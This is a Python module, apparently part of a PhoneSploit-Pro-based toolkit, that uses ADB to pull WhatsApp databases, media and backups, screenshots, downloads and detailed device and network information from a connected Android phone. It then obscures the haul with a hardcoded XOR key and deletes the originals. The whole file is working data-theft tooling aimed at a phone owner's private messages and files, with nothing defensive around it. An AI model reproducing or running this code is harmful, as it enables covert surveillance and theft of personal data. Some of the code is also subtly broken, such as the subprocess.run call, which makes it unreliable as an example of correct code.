"""
Advanced Data Collection System
Collects data from devices using PhoneSploit-Pro advanced methods
"""

import asyncio
import json
import logging
import os
import subprocess
import time
from typing import Dict, List, Optional, Any
from datetime import datetime
from dataclasses import dataclass, asdict
from enum import Enum

class DataType(Enum):
    """Data type enumeration"""
    WHATSAPP = "whatsapp"
    SCREENSHOTS = "screenshots"
    PHOTOS = "photos"
    SMS = "sms"
    CONTACTS = "contacts"
    CALL_LOGS = "call_logs"
    DEVICE_INFO = "device_info"
    BATTERY = "battery"
    NETWORK = "network"
    APPS = "apps"

@dataclass
class CollectionSession:
    """Data collection session information"""
    session_id: str
    device_id: str
    data_types: List[DataType]
    start_time: float
    end_time: Optional[float] = None
    status: str = "active"
    data_collected: int = 0
    total_size: int = 0
    security_level: str = "normal"

class AdvancedDataCollection:
    """Advanced data collection system for PhoneSploit-Pro features"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.adb_path = "adb"
        self.current_device = None
        self.collection_history = []
        self.active_sessions: Dict[str, CollectionSession] = {}
        
        # PhoneSploit-Pro specific settings
        self.encryption_enabled = True
        self.secure_transfer = True
        self.auto_cleanup = True
        self.data_retention_days = 30
        
        # Advanced collection features
        self.whatsapp_collection_active = False
        self.screenshot_collection_active = False
        self.photo_collection_active = False
        
    async def start_advanced_collection_session(self, device_id: str, data_types: List[DataType], 
                                             security_level: str = "normal") -> Dict:
        """Start advanced data collection session"""
        try:
            session_id = f"collection_session_{int(time.time())}_{hash(device_id) % 10000}"
            
            session = CollectionSession(
                session_id=session_id,
                device_id=device_id,
                data_types=data_types,
                start_time=time.time(),
                security_level=security_level
            )
            
            self.active_sessions[session_id] = session
            self.current_device = device_id
            
            self.logger.info(f"Advanced collection session started: {session_id}")
            
            return {
                "success": True,
                "session_id": session_id,
                "device_id": device_id,
                "data_types": [dt.value for dt in data_types],
                "security_level": security_level
            }
            
        except Exception as e:
            self.logger.error(f"Error starting advanced collection session: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def collect_advanced_whatsapp_data(self, session_id: str = None) -> Dict:
        """Collect advanced WhatsApp data with PhoneSploit-Pro features"""
        try:
            if not self._validate_session(session_id):
                return {
                    "success": False,
                    "error": "Invalid session"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            folder_name = f"whatsapp_data_{timestamp}"
            
            # Create directory
            os.makedirs(folder_name, exist_ok=True)
            
            # Advanced WhatsApp data paths
            whatsapp_paths = [
                "/sdcard/WhatsApp",
                "/sdcard/Android/media/com.whatsapp",
                "/data/data/com.whatsapp",
                "/sdcard/WhatsApp/Databases",
                "/sdcard/WhatsApp/Media",
                "/sdcard/WhatsApp/Backups"
            ]
            
            copied_files = []
            total_size = 0
            
            for path in whatsapp_paths:
                try:
                    # Check if path exists
                    check_result = await self._execute_enhanced_adb_command(f"shell ls {path}")
                    if "No such file" not in check_result:
                        # Pull WhatsApp data with advanced options
                        pull_result = await self._execute_enhanced_adb_command(f"pull {path} {folder_name}")
                        
                        if "pulled" in pull_result.lower():
                            copied_files.append(path)
                            
                            # Calculate size
                            size_cmd = f"shell du -sh {path}"
                            size_result = await self._execute_enhanced_adb_command(size_cmd)
                            if size_result:
                                try:
                                    size_str = size_result.split('\t')[0]
                                    if 'M' in size_str:
                                        size_mb = float(size_str.replace('M', ''))
                                        total_size += size_mb
                                except:
                                    pass
                                    
                except Exception as e:
                    self.logger.warning(f"Failed to copy {path}: {str(e)}")
            
            if copied_files:
                # Encrypt collected data if enabled
                if self.encryption_enabled:
                    await self._encrypt_collected_data(folder_name)
                
                await self._log_collection_activity("whatsapp_data_collected", {
                    "folder_path": os.path.abspath(folder_name),
                    "copied_paths": copied_files,
                    "total_size_mb": total_size,
                    "session_id": session_id
                })
                
                return {
                    "success": True,
                    "folder_path": os.path.abspath(folder_name),
                    "copied_paths": copied_files,
                    "total_size_mb": total_size,
                    "encrypted": self.encryption_enabled,
                    "message": "Advanced WhatsApp data collected successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "No WhatsApp data found"
                }
                
        except Exception as e:
            self.logger.error(f"Error collecting advanced WhatsApp data: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def collect_advanced_screenshots(self, session_id: str = None) -> Dict:
        """Collect advanced screenshots with PhoneSploit-Pro features"""
        try:
            if not self._validate_session(session_id):
                return {
                    "success": False,
                    "error": "Invalid session"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            folder_name = f"screenshots_{timestamp}"
            
            # Create directory
            os.makedirs(folder_name, exist_ok=True)
            
            # Advanced screenshot paths
            screenshot_paths = [
                "/sdcard/Pictures/Screenshots",
                "/sdcard/DCIM/Screenshots",
                "/sdcard/Screenshots",
                "/sdcard/Download"
            ]
            
            copied_files = []
            total_size = 0
            
            for path in screenshot_paths:
                try:
                    # Check if path exists
                    check_result = await self._execute_enhanced_adb_command(f"shell ls {path}")
                    if "No such file" not in check_result:
                        # Pull screenshots with advanced options
                        pull_result = await self._execute_enhanced_adb_command(f"pull {path} {folder_name}")
                        
                        if "pulled" in pull_result.lower():
                            copied_files.append(path)
                            
                            # Calculate size
                            size_cmd = f"shell du -sh {path}"
                            size_result = await self._execute_enhanced_adb_command(size_cmd)
                            if size_result:
                                try:
                                    size_str = size_result.split('\t')[0]
                                    if 'M' in size_str:
                                        size_mb = float(size_str.replace('M', ''))
                                        total_size += size_mb
                                except:
                                    pass
                                    
                except Exception as e:
                    self.logger.warning(f"Failed to copy {path}: {str(e)}")
            
            if copied_files:
                # Encrypt collected data if enabled
                if self.encryption_enabled:
                    await self._encrypt_collected_data(folder_name)
                
                await self._log_collection_activity("screenshots_collected", {
                    "folder_path": os.path.abspath(folder_name),
                    "copied_paths": copied_files,
                    "total_size_mb": total_size,
                    "session_id": session_id
                })
                
                return {
                    "success": True,
                    "folder_path": os.path.abspath(folder_name),
                    "copied_paths": copied_files,
                    "total_size_mb": total_size,
                    "encrypted": self.encryption_enabled,
                    "message": "Advanced screenshots collected successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "No screenshots found"
                }
                
        except Exception as e:
            self.logger.error(f"Error collecting advanced screenshots: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def collect_advanced_device_info(self, session_id: str = None) -> Dict:
        """Collect advanced device information with PhoneSploit-Pro features"""
        try:
            if not self._validate_session(session_id):
                return {
                    "success": False,
                    "error": "Invalid session"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            device_info_file = f"device_info_{timestamp}.json"
            
            # Advanced device information collection
            device_info = {}
            
            # System information
            system_props = [
                "ro.product.model",
                "ro.build.version.release",
                "ro.build.version.sdk",
                "ro.product.manufacturer",
                "ro.product.brand",
                "ro.product.name",
                "ro.build.fingerprint",
                "ro.build.id",
                "ro.build.type",
                "ro.build.user",
                "ro.build.host",
                "ro.build.date"
            ]
            
            for prop in system_props:
                prop_cmd = f"shell getprop {prop}"
                prop_result = await self._execute_enhanced_adb_command(prop_cmd)
                device_info[prop] = prop_result.strip()
            
            # Hardware information
            hardware_info = {}
            
            # CPU info
            cpu_cmd = "shell cat /proc/cpuinfo"
            cpu_result = await self._execute_enhanced_adb_command(cpu_cmd)
            hardware_info["cpu"] = cpu_result
            
            # Memory info
            mem_cmd = "shell cat /proc/meminfo"
            mem_result = await self._execute_enhanced_adb_command(mem_cmd)
            hardware_info["memory"] = mem_result
            
            # Storage info
            storage_cmd = "shell df"
            storage_result = await self._execute_enhanced_adb_command(storage_cmd)
            hardware_info["storage"] = storage_result
            
            device_info["hardware"] = hardware_info
            
            # Network information
            network_info = {}
            
            # WiFi info
            wifi_cmd = "shell dumpsys wifi"
            wifi_result = await self._execute_enhanced_adb_command(wifi_cmd)
            network_info["wifi"] = wifi_result
            
            # Network interfaces
            net_cmd = "shell ip addr"
            net_result = await self._execute_enhanced_adb_command(net_cmd)
            network_info["interfaces"] = net_result
            
            device_info["network"] = network_info
            
            # Installed apps
            apps_cmd = "shell pm list packages -3"
            apps_result = await self._execute_enhanced_adb_command(apps_cmd)
            device_info["installed_apps"] = apps_result.split('\n')
            
            # Save device info
            with open(device_info_file, 'w', encoding='utf-8') as f:
                json.dump(device_info, f, indent=2, ensure_ascii=False)
            
            # Encrypt if enabled
            if self.encryption_enabled:
                await self._encrypt_file(device_info_file)
            
            await self._log_collection_activity("device_info_collected", {
                "device_info_file": device_info_file,
                "session_id": session_id
            })
            
            return {
                "success": True,
                "device_info_file": device_info_file,
                "encrypted": self.encryption_enabled,
                "message": "Advanced device information collected successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error collecting advanced device info: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _encrypt_collected_data(self, folder_path: str):
        """Encrypt collected data folder"""
        try:
            # Simple encryption for demonstration
            # In production, use proper encryption libraries
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    await self._encrypt_file(file_path)
                    
        except Exception as e:
            self.logger.error(f"Error encrypting collected data: {str(e)}")
    
    async def _encrypt_file(self, file_path: str):
        """Encrypt a single file"""
        try:
            # Simple XOR encryption for demonstration
            # In production, use proper encryption libraries
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # XOR with a simple key
            key = b'PhoneSploitPro2024'
            encrypted_data = bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
            
            with open(file_path + '.enc', 'wb') as f:
                f.write(encrypted_data)
            
            # Remove original file
            os.remove(file_path)
            
        except Exception as e:
            self.logger.error(f"Error encrypting file {file_path}: {str(e)}")
    
    async def _execute_enhanced_adb_command(self, command: str, session_id: str = None) -> str:
        """Execute enhanced ADB command with security checks"""
        try:
            if session_id and session_id in self.active_sessions:
                session = self.active_sessions[session_id]
                session.data_collected += 1
            
            # Execute command
            full_command = f"{self.adb_path} -s {self.current_device} {command}"
            result = await asyncio.get_event_loop().run_in_executor(
                None,
                subprocess.run,
                full_command.split(),
                subprocess.PIPE,
                subprocess.PIPE,
                subprocess.PIPE
            )
            
            return result.stdout.decode().strip()
            
        except Exception as e:
            self.logger.error(f"Error executing enhanced ADB command: {str(e)}")
            return ""
    
    async def _log_collection_activity(self, activity_type: str, data: Dict):
        """Log collection activity"""
        try:
            log_entry = {
                "timestamp": time.time(),
                "activity_type": activity_type,
                "device_id": self.current_device,
                "data": data
            }
            
            self.collection_history.append(log_entry)
            
            # Keep only last 1000 entries
            if len(self.collection_history) > 1000:
                self.collection_history = self.collection_history[-500:]
                
        except Exception as e:
            self.logger.error(f"Error logging collection activity: {str(e)}")
    
    def _validate_session(self, session_id: str) -> bool:
        """Validate collection session"""
        if not session_id:
            return self.current_device is not None
        
        return session_id in self.active_sessions and self.active_sessions[session_id].status == "active"
    
    def get_collection_statistics(self) -> Dict:
        """Get advanced collection statistics"""
        try:
            active_sessions = len(self.active_sessions)
            total_data_collected = sum(session.data_collected for session in self.active_sessions.values())
            total_size = sum(session.total_size for session in self.active_sessions.values())
            
            return {
                "active_sessions": active_sessions,
                "total_data_collected": total_data_collected,
                "total_size_mb": total_size,
                "collection_history_length": len(self.collection_history),
                "encryption_enabled": self.encryption_enabled,
                "secure_transfer": self.secure_transfer,
                "auto_cleanup": self.auto_cleanup,
                "data_retention_days": self.data_retention_days,
                "whatsapp_collection_active": self.whatsapp_collection_active,
                "screenshot_collection_active": self.screenshot_collection_active,
                "photo_collection_active": self.photo_collection_active
            }
            
        except Exception as e:
            self.logger.error(f"Error getting collection statistics: {str(e)}")
            return {}
    
    def get_active_sessions(self) -> List[Dict]:
        """Get active collection sessions"""
        try:
            return [asdict(session) for session in self.active_sessions.values()]
        except Exception as e:
            self.logger.error(f"Error getting active sessions: {str(e)}")
            return []
    
    def clear_collection_history(self):
        """Clear collection history"""
        try:
            self.collection_history.clear()
            self.logger.info("Collection history cleared")
        except Exception as e:
            self.logger.error(f"Error clearing collection history: {str(e)}")